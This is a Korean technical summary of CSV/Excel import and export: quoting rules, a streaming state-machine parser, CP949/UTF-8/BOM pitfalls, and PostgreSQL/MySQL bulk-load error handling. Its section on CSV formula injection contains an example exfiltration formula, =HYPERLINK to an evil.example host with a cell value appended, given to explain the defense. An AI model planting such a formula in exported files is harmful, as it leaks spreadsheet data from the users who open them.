# database/35-bulk-file-import-export — CSV·엑셀 입출력: 인용 규칙, 인코딩, 스트리밍, 행 단위 오류 — 정리 (힌트)

## 해결하는 문제

관리자 화면의 "엑셀로 올리기·내려받기"는 거의 모든 업무 시스템에 있다.\
CSV는 단순해 보이지만, 파일 하나가 DB에 들어가기까지 여러 층에서 깨진다.

```text
  사용자 PC (엑셀)                                  서버                         DB
  ┌─────────────┐   업로드   ┌──────────────────────────────────┐   적재   ┌─────────┐
  │ 저장: CP949? │ ────────> │ ① 바이트 → 문자 (인코딩)             │ ──────> │ COPY /  │
  │   UTF-8+BOM? │           │ ② 문자 → 레코드 (인용·줄바꿈 규칙)     │         │ LOAD    │
  └─────────────┘           │ ③ 레코드 → 행 (형 변환·검증)          │         │ DATA    │
        ^                   │ ④ 실패한 행을 어떻게 알리나           │         └─────────┘
        │ 다운로드            └──────────────────────────────────┘
        └────────── ⑤ 셀이 수식으로 실행되지 않게 (CSV 수식 주입)
```

쉬운 예: 외국에서 온 손편지를 옮겨 적는다. 먼저 어느 나라 글자인지 알아야 하고(인코딩), 문단이 어디서 끝나는지 봐야 하고(인용·줄바꿈), 읽을 수 없는 줄은 표시해 두어야 한다(행 단위 오류).\
똑같은 구조다. 층마다 규칙이 있고, 한 층이라도 틀리면 **에러 없이** 엉뚱한 값이 들어가기 쉽다.

실무 예:
- 한국 사용자가 엑셀로 저장한 CSV는 CP949인 경우가 많다. 서버는 UTF-8로 읽는다.
- UTF-8 CSV를 엑셀로 열면 한글이 깨진다. BOM이 없어서다(Microsoft 지원 문서).
- 3만 행 중 10행이 실패했는데 "업로드 완료"만 뜬다.
- 내려받은 CSV를 관리자가 열자 `=HYPERLINK(…)` 셀이 수식으로 동작한다.

## 동작·원리

### 1. RFC 4180 — CSV의 "흔한" 규칙

```text
  file   = [header CRLF] record *(CRLF record) [CRLF]
  field  = escaped / non-escaped
  escaped = DQUOTE *(TEXTDATA / COMMA / CR / LF / 2DQUOTE) DQUOTE

  1,홍길동,"서울, 강남구","메모 ""VIP"""            ← 쉼표·따옴표를 품은 필드는 따옴표로 감싼다
  2,김철수,부산,"여러 줄␍␊둘째 줄"                   ← 줄바꿈도 따옴표 안이면 데이터다
     └ 이 두 줄이 레코드 하나다
```

- RFC 4180은 **Informational** 문서다. 스스로 "공식 명세가 없어 해석이 제각각"이라 적고, 대부분의 구현이 따르는 듯한 형식을 기록했다.
- 규범 수준도 섞여 있다. 줄바꿈·따옴표·쉼표를 품은 필드는 따옴표로 감싸야 한다(**should**). 따옴표 안의 `"`는 `""`로 적어야 한다(**must**). 줄 끝은 CRLF다.
- 그래서 `line.split(",")`나 "한 줄 = 한 행"은 틀린다. 로컬 재현(예시): `'1,홍길동,"서울, 강남구",x'.split(',')`는 5칸으로 쪼개졌다. 열이 하나씩 밀린다.
- PostgreSQL 17 COPY 문서도 CSV가 "표준이라기보다 관례"라고 적는다. CSV 모드는 따옴표 안의 CR·LF를 인식한다. `COPY TO STDOUT`은 행 끝에 `\n`을 쓴다(CRLF 아님).

### 2. 상태 기계로 읽는다

```text
             ┌──── 일반 문자 ────┐
             v                  │
  ┌───────┐ 일반  ┌──────────┐   │     , → 필드 끝        \n → 레코드 끝
  │ START │─────>│ UNQUOTED │───┘
  └───────┘      └──────────┘
      │ "
      v
  ┌────────┐  "   ┌───────┐  "  (= "" → 문자 ")
  │ QUOTED │─────>│ QUOTE │──────────────> QUOTED
  └────────┘<─────└───────┘
   ↺ , \n 도 데이터   │ , → 필드 끝 / \n → 레코드 끝 / 그 밖 → 형식 오류
   EOF에서 QUOTED면 → "따옴표가 닫히지 않음"
```

- 상태 넷이면 된다. 쉼표·줄바꿈이 **어느 상태에서** 나왔는지로 뜻이 갈린다.
- 로컬 재현(예시, Node 18): 아래 「적용」의 파서가 `여러 줄\r\n둘째 줄`을 한 필드로 읽었다. 닫히지 않은 따옴표는 `line 1: unterminated quote` 에러였다. 16바이트 청크로 잘라 읽어도(한글이 청크 경계에서 잘려도) 결과가 같았다.

### 3. 인코딩 — 바이트를 무엇으로 읽나

```text
  "홍"   UTF-8  : ED 99 8D
         CP949  : C8 AB
  파일 앞 3바이트 EF BB BF = UTF-8 BOM (U+FEFF)

  CP949 파일을 UTF-8로 읽으면
    엄격(strict) 디코더  → 예외        Java  Files.readAllLines(p, UTF_8) → MalformedInputException
                                       PG    COPY → invalid byte sequence for encoding "UTF8": 0xb1
    관대(replace) 디코더 → � 로 치환    Java  new String(bytes, UTF_8) → "ȫ�浿"  (조용한 손상)
```

- *BOM(byte order mark)*: 파일 맨 앞에 붙는 U+FEFF. UTF-8에서는 바이트 순서 의미는 없고 "이건 UTF-8"이라는 표시로 쓰인다.
- *CP949*: 마이크로소프트의 한국어 코드 페이지(UHC). EUC-KR(KS X 1001 완성형)에 없는 한글 음절을 더한 확장이다. WHATWG는 이 인덱스가 유니코드 한글 음절 블록 전체를 덮는다고 적는다.
- EUC-KR로 읽으면 확장 음절에서 깨진다. 로컬 재현(예시): "똠방각하"(똠 = CP949 `8C 63`)
  - Java 8 `EUC-KR` → `MalformedInputException`. `MS949` → 정상.
  - PostgreSQL 17 `ENCODING 'EUC_KR'` → `invalid byte sequence for encoding "EUC_KR": 0x8c 0x63`. `'UHC'`(별칭 `WIN949`) → 정상. `'CP949'`라는 이름은 인식되지 않았다.
  - MySQL 8.4 `CHARACTER SET euckr`의 `LOAD DATA`는 정상으로 읽었다. MySQL의 `euckr`은 이름과 달리 CP949 확장 음절도 담는다(로컬 확인: `CONVERT(UNHEX('8C63') USING euckr)` = '똠'). 제품마다 "EUC-KR"의 범위가 다르다.
- WHATWG Encoding 표준은 `euc-kr`·`ks_c_5601-1987`·`windows-949` 등 레이블을 모두 EUC-KR 인코딩 하나로 묶는다. 그 인덱스는 "KS X 1001과 UHC, 합쳐서 Windows Codepage 949"다. 브라우저의 "euc-kr"은 사실상 CP949다.
- BOM은 디코더가 지우지 않는 경우가 많다.
  - Java 8 `Files.readAllLines(…, UTF_8)`의 첫 줄은 U+FEFF로 시작했다. `startsWith("id")`가 false였다.
  - PostgreSQL `HEADER MATCH`는 `column name mismatch in header line field 1: got "﻿id", expected "id"`, 헤더 없는 파일은 `invalid input syntax for type bigint: "﻿1"`.
  - MySQL `LOAD DATA`는 `Incorrect integer value: '﻿1' for column 'id' at row 1`(ERROR 1366).
  - WHATWG `decode`는 BOM을 먼저 확인해 그 인코딩으로 읽고 BOM 바이트를 버린다. Node `TextDecoder('utf-8')`는 기본으로 BOM을 지웠다. `Buffer.toString`과 `fs.createReadStream(…, 'utf8')`은 남겼다.
- 엑셀은 BOM이 있는 UTF-8 CSV는 그냥 열린다. BOM이 없으면 Power Query나 텍스트 가져오기로 열라고 안내한다(Microsoft 지원 문서).

### 4. 적재 정책 — 한 행이 틀리면 전체를 버리나

```text
  입력 4행:  1,a,b,c  /  X,b,c,d  /  3,c,d,e  /  4,d,e      (id는 정수, 4열)

  PostgreSQL 17 COPY (기본 ON_ERROR stop) → ERROR: invalid input syntax for type bigint: "X", 적재 0행
  PostgreSQL 17 COPY ON_ERROR ignore       → "X" 행은 건너뜀(NOTICE), 하지만 "4,d,e"는
                                             ERROR: missing data for column "memo" → 적재 0행
  MySQL 8.4 LOAD DATA (strict)             → ERROR 1366 Incorrect integer value: 'X', 적재 0행
  MySQL 8.4 LOAD DATA … IGNORE             → 4행 모두 적재, 경고만:
                                             'X' → id = 0 으로,  "4,d,e" → memo = 기본값(NULL) 으로   ← 조용한 손상
```

- 로컬 재현(예시, PostgreSQL 17.11 / MySQL 8.4.10) 결과다.
- `ON_ERROR ignore`는 PostgreSQL 17에서 생긴 옵션이다. **형 변환 오류만** 건너뛴다. 열 개수 오류는 여전히 전체를 멈춘다(COPY 문서: "error converting a column's input value into its data type").
  - `LOG_VERBOSITY verbose`면 건너뛴 행마다 줄 번호·열 이름을 NOTICE로 낸다. 기본은 끝에 건너뛴 개수 한 줄뿐이다.
- MySQL의 `IGNORE`는 형 변환·열 개수 오류에서 "건너뛰기"가 아니다. 값을 **바꿔서 넣는다**(빠진 열은 그 열의 기본값 — 위 예의 `memo`는 기본값이 NULL). 단, PRIMARY KEY·UNIQUE 중복 행은 버린다. `SHOW WARNINGS`를 보지 않으면 아무도 모른다.
- MySQL 8.4에서는 `LOAD DATA LOCAL`도 (`REPLACE`가 없으면) `IGNORE`를 준 것처럼 동작한다. 서버가 전송 중인 파일을 멈출 수 없어서다(LOAD DATA 문서 "Duplicate-Key and Error Handling").
- 선택지는 셋이다.
  - 전부 아니면 전무: DB 기본값(MySQL은 `IGNORE`·`LOCAL` 없이 strict SQL 모드일 때). 한 행 때문에 3만 행이 막힌다.
  - 좋은 행만 넣고 나쁜 행 보고: 앱이 행마다 검증해 오류 목록(줄 번호·열·사유)을 돌려준다.
  - 먼저 검증만(dry-run): 사용자가 고친 파일을 다시 올린다.

### 5. 메모리 — 파일 전체를 올리지 않는다

```text
  전체 적재:  byte[] 파일 = readAllBytes()  → String → List<String[]>     메모리 ≈ 파일 크기 × 여러 배
  스트리밍:   InputStream ─(디코더)→ Reader ─(파서, 필드 상한)→ 행 ─(배치 1000)→ DB
                              유계 버퍼                              메모리 ≈ 버퍼 + 배치 하나
```

- Java `Files.readAllBytes`는 필요한 크기의 배열을 못 잡으면(예: 파일이 2GB 초과) `OutOfMemoryError`를 던진다고 문서에 적혀 있다.
- 스트리밍 파서에도 상한이 필요하다. 닫히지 않은 따옴표 하나가 파일 끝까지를 **한 필드**로 만든다. 필드 길이 상한이 없으면 결국 전체 적재와 같아진다.
- 업로드 자체의 스트리밍은 [network/42-large-file-upload-patterns](../../network/42-large-file-upload-patterns/2-summary.md), 다운로드의 청크 전송은 [network/40-chunked-and-streaming-responses](../../network/40-chunked-and-streaming-responses/2-summary.md).

### 6. 내보내기 — CSV 수식 주입

```text
  DB 값:     =HYPERLINK("http://evil.example/?d="&A1,"click")
  CSV 셀:    "=HYPERLINK(""http://evil.example/?d=""&A1,""click"")"    ← 인용은 CSV 규칙일 뿐
  엑셀:      = 로 시작 → 수식으로 해석 → 링크 클릭 시 A1 값이 외부로
```

- OWASP: 스프레드시트는 `=`로 시작하는 셀을 수식으로 해석한다. 위험한 시작 문자는 `=`·`+`·`-`·`@`·탭(0x09)·CR(0x0D)·LF(0x0A), 일부 로캘의 전각 `＝＋－＠`다.
- OWASP가 적은 완화
  - 필드를 따옴표로 감싸고, 앞에 `'`를 붙이고, `"`를 `""`로 이스케이프한다.
  - 엑셀은 저장 후 다시 열면 이 이스케이프를 지울 수 있다. 그래서 엑셀에서는 따옴표 안에서 탭(0x09)을 앞에 붙이는 방법도 적는다. 대신 탭이 데이터에 남는다.
  - "모든 스프레드시트와 모든 후속 소비자에게 안전한 방법은 없다."
- 로컬 재현(예시, PostgreSQL 17.11): `COPY … TO STDOUT (FORMAT csv)`는 `=HYPERLINK(…)`를 인용만 하고 그대로 내보냈다. `-2+3`은 인용조차 안 했다. `CASE WHEN note ~ '^[=+\-@\t\r]' THEN '''' || note …`로 앞에 `'`를 붙여야 했다.

## 쓰이는 자료구조·알고리즘

- **상태 기계 파서(인용 상태)** — 상태 {START, UNQUOTED, QUOTED, QUOTE} × 입력 {`"`, `,`, `\n`, 기타}의 전이표. 한 글자씩 한 번 보므로 O(n)이고, 앞을 다시 읽지 않아 스트리밍이 된다.
- **유계 버퍼 스트리밍** — 디코더 버퍼 + 필드 길이 상한 + DB 배치 크기로 메모리가 파일 크기와 무관해진다. 역압은 [ops-patterns/05-backpressure](../../ops-patterns/05-backpressure/2-summary.md).
- **디코더의 오류 정책** — 잘못된 바이트를 만나면 REPORT(예외)하거나 REPLACE(U+FFFD)한다. Java `Charset.decode`·`new String(bytes, cs)`는 항상 REPLACE이고, `CharsetDecoder`를 직접 쓰면 REPORT로 둘 수 있다(Charset 문서).
- **배치 적재** — 검증한 행을 1000개씩 `COPY`/다중 행 INSERT로 넣는다. 대량 DML의 청크·체크포인트는 [34-large-backfill-and-batch-dml](../34-large-backfill-and-batch-dml/2-summary.md).

## 적용 — 풀어나가는 법

### 1. 가져오기 순서

```text
  ① 인코딩 결정: BOM·제공자가 밝힌 인코딩 우선 → 없으면 엄격 UTF-8 시도 → 실패하면 CP949로
     (엄격 UTF-8 성공 ≠ UTF-8 확정: CP949 "홍" C8 AB는 UTF-8로도 유효한 "ȫ". 미리보기·사용자 확인)
  ② 파싱: 상태 기계, 필드·행 길이 상한, 헤더 이름 검증(BOM 제거 후)
  ③ 행 검증: 형·필수·범위·중복 → 오류 목록 {줄, 열, 값, 사유}
  ④ 정책: 전부/좋은 행만/검증만 — 화면에 "성공 29,990 / 실패 10 (오류 파일 받기)"
  ⑤ 적재: 배치 트랜잭션, 업로드 ID로 멱등(같은 파일 재업로드 시 중복 방지)
```

### 2. 스트리밍 파서 (JavaScript, Node 18에서 실행 확인)

```js
// RFC 4180 스타일, 한 글자씩 상태 전이. chunks = 문자열 청크의 async iterable
export async function* parseCsv(chunks, { maxField = 1 << 20 } = {}) {
  let state = 'START', field = '', row = [], line = 1, rowLine = 1, first = true;
  const endField = () => { row.push(field); field = ''; };
  for await (const chunk of chunks) {
    for (const ch of chunk) {
      if (first) { first = false; if (ch === '﻿') continue; }  // UTF-8 BOM 제거
      switch (state) {
        case 'START':
          if (ch === '"') { state = 'QUOTED'; break; }
          state = 'UNQUOTED';                                          // fallthrough
        case 'UNQUOTED':
          if (ch === ',') { endField(); state = 'START'; }
          else if (ch === '\n') { endField(); yield { line: rowLine, row }; row = []; line++; rowLine = line; state = 'START'; }
          else if (ch === '"') throw new Error(`line ${line}: quote inside unquoted field`);
          else if (ch !== '\r') field += ch;
          break;
        case 'QUOTED':                                                 // 쉼표·줄바꿈도 데이터
          if (ch === '"') state = 'QUOTE';
          else { if (ch === '\n') line++; field += ch; }
          break;
        case 'QUOTE':                                                  // "" 이면 문자 ", 아니면 필드 끝
          if (ch === '"') { field += '"'; state = 'QUOTED'; }
          else if (ch === ',') { endField(); state = 'START'; }
          else if (ch === '\n') { endField(); yield { line: rowLine, row }; row = []; line++; rowLine = line; state = 'START'; }
          else if (ch !== '\r') throw new Error(`line ${line}: unexpected char after closing quote`);
          break;
      }
      if (field.length > maxField) throw new Error(`line ${rowLine}: field too long`);  // 추가한 뒤 검사
    }
  }
  if (state === 'QUOTED') throw new Error(`line ${rowLine}: unterminated quote`);
  if (field !== '' || row.length || state === 'QUOTE') { endField(); yield { line: rowLine, row }; }  // 파일이 "" 하나여도 한 행
}
```

- `line`은 파일의 물리 줄, `rowLine`은 레코드가 시작한 줄이다. 오류 보고에 `rowLine`을 쓴다. 따옴표 안 줄바꿈이 있으면 레코드 번호 ≠ 줄 번호다.
- 비따옴표 필드 안의 `\r`은 버린다(CRLF 처리). 따옴표 안의 `\r`은 데이터로 남긴다.
- 비따옴표 필드 안의 `"`(예: `abc"def`)는 형식 오류로 던진다. RFC 4180은 따옴표로 감싸지 않은 필드에 `"`를 허용하지 않는다.
- 이 예시는 필드 길이 상한만 둔다. 행 단위 상한(열 개수·행 길이)은 따로 둬야 한다(열 개수는 ③ 행 검증에서 본다).

### 3. 인코딩을 엄격하게 (Java)

```java
// 잘못된 바이트를 � 로 바꾸지 않고 예외로 받는다
CharsetDecoder utf8 = StandardCharsets.UTF_8.newDecoder()
        .onMalformedInput(CodingErrorAction.REPORT)
        .onUnmappableCharacter(CodingErrorAction.REPORT);
try (Reader r = new BufferedReader(new InputStreamReader(in, utf8))) {
    // 파싱 … MalformedInputException 이면 CP949(Charset.forName("MS949"))로 다시 읽거나 사용자에게 묻는다
}
```

- `Files.newBufferedReader(path, cs)`도 잘못된 바이트에서 `IOException`을 던진다(Files 문서). 로컬 재현에서 `Files.readAllLines(p, UTF_8)`은 `MalformedInputException: Input length = 1`이었다.

### 4. DB로 적재 — 이미 검증된 데이터에 COPY / LOAD DATA

```sql
-- PostgreSQL 17 (psql). 파일 인코딩을 명시한다
\copy imp FROM 'upload.csv' WITH (FORMAT csv, HEADER match, ENCODING 'UHC')
-- 행 단위 형 변환 오류만 건너뛰고 기록 (17+)
\copy imp FROM 'upload.csv' WITH (FORMAT csv, HEADER true, ON_ERROR ignore, LOG_VERBOSITY verbose)

-- MySQL 8.4 (secure_file_priv가 디렉터리면 그 안이어야 한다. NULL이면 서버 파일 입출력 금지, 빈 값이면 제한 없음)
LOAD DATA INFILE '/var/lib/mysql-files/upload.csv' INTO TABLE imp CHARACTER SET euckr
  FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED BY '\r\n' IGNORE 1 LINES;
SHOW WARNINGS;          -- IGNORE를 썼다면 반드시 확인
```

- `LOAD DATA LOCAL`은 서버 `local_infile`이 기본 OFF다(8.4). 로컬 재현: `ERROR 3948 (42000): Loading local data is disabled; this must be enabled on both the client and server sides`.

### 5. 내보내기

```text
  - 엑셀 사용자용: UTF-8 + BOM(EF BB BF) 앞에 붙이기, CRLF, 모든 필드 인용
  - 수식 시작 문자(= + - @ 탭 CR LF)로 시작하는 셀은 앞에 ' (또는 엑셀용 탭) — 기계 소비용 파일과 사람용 파일을 나눈다
  - 대량이면 스트리밍: 커서/COPY TO STDOUT → 응답 스트림 (한 번에 메모리로 모으지 않는다)
```

## 장애 시나리오와 대처

### 1. 엑셀에서 연 UTF-8 CSV의 한글이 깨짐

- **현상**: 내려받은 CSV를 엑셀로 열면 한글이 알아볼 수 없는 글자로 보인다.
- **보이는 형태**: 파일 자체는 올바른 UTF-8이다(`file`·`xxd`로 앞 바이트 확인, BOM 없음).
- **원인**: 엑셀은 BOM 없는 UTF-8 CSV를 그냥 열 때 UTF-8로 해석하지 않는다(Microsoft 지원 문서: BOM이 있으면 정상, 없으면 가져오기 기능 사용).
- **대처**: 사람용 내보내기에는 BOM을 붙인다. 이 파일을 다시 기계로 읽는 쪽은 BOM을 지워야 한다(3절 사례들).

### 2. CP949 파일을 UTF-8로 읽음 → 예외 또는 �

- **현상**: 한국 사용자가 올린 파일만 실패한다. 또는 성공했는데 이름이 `ȫ�浿`로 저장됐다.
- **보이는 형태**
  - Java: `java.nio.charset.MalformedInputException: Input length = 1`(엄격 디코더) 또는 `�` 섞인 문자열(관대 디코더).
  - PostgreSQL: `ERROR: invalid byte sequence for encoding "UTF8": 0xb1`.
  - MySQL: `ERROR 1300 (HY000): Invalid utf8mb4 character string`(로컬 재현).
- **원인**: 파일은 CP949, 읽는 쪽은 UTF-8. 관대 디코더는 에러 없이 데이터를 망가뜨린다.
- **대처**
  - 엄격 디코더로 먼저 시도하고, 실패하면 CP949(Java `MS949`, PG `UHC`)로 읽는다. 엄격 디코딩이 성공해도 CP949일 수 있으니(짧은 한글은 우연히 유효한 UTF-8) 가능하면 인코딩을 받거나 미리보기로 확인한다.
  - EUC-KR로 읽으면 확장 음절(똠 등)에서 다시 깨진다. 이미 �로 저장된 데이터는 원본 파일 없이는 복구할 수 없다.

### 3. 파일 전체를 메모리에 → OOM

- **현상**: 큰 파일 업로드 때 서버가 죽거나 GC가 몇 초씩 멈춘다.
- **보이는 형태**: `java.lang.OutOfMemoryError: Java heap space`. 업로드 크기와 힙 사용량이 같이 오른다.
- **원인**: `readAllBytes`·`readAllLines`·"행 전부를 List에 모아 검증 후 저장". 문자열·객체 오버헤드로 파일 크기의 몇 배가 든다.
- **대처**: 스트리밍 파서 + 배치 적재. 필드·행 길이 상한과 업로드 크기 상한을 둔다. 닫히지 않은 따옴표는 상한에서 끊는다.

### 4. 필드 안 줄바꿈·따옴표 → 열 밀림

- **현상**: 주소나 메모에 쉼표·줄바꿈이 있는 행부터 값이 옆 열로 밀려 저장된다. 에러가 안 나기도 한다.
- **보이는 형태**: `"서울`과 ` 강남구"`가 두 열에 나뉘어 있다(로컬 재현 split 5칸). 줄 단위로 읽으면 "열 개수가 맞지 않음"이 따옴표 안 줄바꿈 위치에서 난다.
- **원인**: `split(",")`·"한 줄 = 한 행" 가정. RFC 4180의 인용 규칙을 무시했다.
- **대처**: 상태 기계 파서(검증된 CSV 라이브러리)를 쓴다. 행마다 열 개수를 검증해, 다르면 그 행을 오류 목록에 넣는다.

### 5. `=HYPERLINK(…)` 셀 → 관리자 PC에서 수식 실행

- **현상**: 사용자가 입력한 이름·메모를 CSV로 내보냈다. 관리자가 엑셀로 열자 링크가 생기고, 클릭하면 시트 값이 외부로 나간다.
- **보이는 형태**: CSV에는 인용된 `"=HYPERLINK(""…"")"`가 그대로 있다(로컬 재현 COPY 출력).
- **원인**: CSV 인용은 구분자 규칙일 뿐이다. 스프레드시트는 `=`·`+`·`-`·`@` 등으로 시작하는 셀을 수식으로 본다(OWASP).
- **대처**: 사람용 내보내기에서 위험 시작 문자 앞에 `'`(엑셀은 따옴표 안 탭)를 붙인다. 원시 데이터가 필요한 기계용 내보내기와 나눈다.

### 6. 3만 행 중 10행 실패를 알리지 않음

- **현상**: "업로드 완료"였는데 나중에 일부 거래처가 빠진 것을 알게 된다.
- **보이는 형태**: 적재 수 29,990 / 파일 30,000. MySQL이면 `LOAD DATA … IGNORE` 뒤 `SHOW WARNINGS`에 1366·1261이 있다. `'X'`는 0으로, 빠진 열은 기본값(이 테이블은 NULL)으로 들어갔다(로컬 재현).
- **원인**: 행 단위 오류를 버리거나 경고로만 남겼다. 성공 수·실패 수를 사용자에게 보여 주지 않았다.
- **대처**: 결과에 "성공 N / 실패 M"과 오류 파일(줄·열·값·사유)을 준다. IGNORE류 옵션 대신 앱에서 검증한다. 파일 행 수와 적재 행 수를 대조한다.

## 핵심 문장

- CSV는 바이트 → 문자(인코딩) → 레코드(인용 규칙) → 행(검증)의 층이다. 층마다 에러 없이 깨지는 길이 있다.
- RFC 4180은 Informational이다. 따옴표 안의 쉼표·줄바꿈은 데이터이므로 상태 기계로 읽고, `split(",")`은 쓰지 않는다.
- 한국 엑셀 파일은 CP949가 흔하다. 엄격 디코더로 먼저 읽고 실패하면 CP949(MS949·UHC)로 읽는다. 성공이 UTF-8을 증명하지는 않는다. EUC-KR은 확장 음절에서 깨진다.
- BOM은 엑셀에는 필요하고 파서에는 방해다. 내보낼 때 붙이고 읽을 때 지운다.
- DB 적재 기본값은 전부 아니면 전무다. PostgreSQL 17 `ON_ERROR ignore`는 형 변환 오류만 건너뛰고, MySQL `IGNORE`는 형 변환 오류 값을 바꿔 넣는다(중복 키 행은 버린다).
- 사람용 내보내기에서는 `=`·`+`·`-`·`@` 등으로 시작하는 셀을 무력화한다. 인용만으로는 수식 실행을 못 막는다.

## 관련 주제·근거

- 선행
  - [34-large-backfill-and-batch-dml](../34-large-backfill-and-batch-dml/2-summary.md) — 배치 적재·체크포인트
  - [architecture/04-character-encoding-unicode](../../architecture/04-character-encoding-unicode/2-summary.md) — UTF-8·BOM·코드 포인트. 원고: [foundations/data-representation](../../foundations/data-representation/README.md)
  - [network/40-chunked-and-streaming-responses](../../network/40-chunked-and-streaming-responses/2-summary.md) — 스트리밍 응답
- 연결
  - [network/42-large-file-upload-patterns](../../network/42-large-file-upload-patterns/2-summary.md) — 업로드 경로
  - [10-collation-and-text-comparison](../10-collation-and-text-comparison/2-summary.md) — 적재 뒤 비교·정렬 규칙
- 표준·문서
  - RFC 4180 "Common Format and MIME Type for CSV Files"(Informational, 2005) §2 정의·ABNF <https://www.rfc-editor.org/rfc/rfc4180>
  - WHATWG Encoding Standard — 레이블 표(euc-kr·windows-949 …), index EUC-KR = KS X 1001 + UHC(Windows Codepage 949), decode의 BOM sniff <https://encoding.spec.whatwg.org/>
  - OWASP "CSV Injection" — 위험 시작 문자, 인용·`'` 접두, 엑셀 재저장 문제와 탭 접두 <https://owasp.org/www-community/attacks/CSV_Injection>
  - Microsoft Support "Opening CSV UTF-8 files correctly in Excel" <https://support.microsoft.com/en-us/office/opening-csv-utf-8-files-correctly-in-excel-8a935af5-3416-4edd-ba7e-3dfd2bc4a032>
  - PostgreSQL 17 COPY(`HEADER MATCH`·`ENCODING`·`ON_ERROR`·`LOG_VERBOSITY`·`FORCE_QUOTE`, CSV 형식 주의, `COPY TO STDOUT`의 `\n`) <https://www.postgresql.org/docs/17/sql-copy.html> · 23.3 Character Set Support(UHC·별칭 WIN949) <https://www.postgresql.org/docs/17/multibyte.html>
  - MySQL 8.4 15.2.9 LOAD DATA · 8.1.6 Security Considerations for LOAD DATA LOCAL · `local_infile`(기본 OFF) <https://dev.mysql.com/doc/refman/8.4/en/load-data.html>
  - Java SE 21 `java.nio.file.Files`(`newBufferedReader`의 IOException, `readAllBytes`의 OutOfMemoryError), `java.nio.charset.Charset.decode`(항상 치환) <https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/nio/file/Files.html>
- 로컬 재현(PostgreSQL 17.11 / MySQL 8.4.10 / Java 1.8.0_504 Nashorn / Node 18.19.1, DB `w31`): 상태 기계 파서(인용 필드의 쉼표·CRLF, 닫히지 않은 따옴표, 16바이트 청크, BOM 제거), naive split 열 밀림, CP949↔UTF-8 오독(Java 예외·� 치환, PG `0xb1`, MySQL 1300), EUC-KR의 확장 음절 실패(Java·PG)와 UHC/MS949 성공, MySQL euckr 성공, BOM의 헤더·정수 오류(PG·MySQL·Java), Node의 BOM 처리 차이, COPY `ON_ERROR ignore`의 한계, MySQL `IGNORE`의 값 변환(0·NULL), `local_infile` 3948, COPY TO의 수식 셀 출력과 `'` 접두
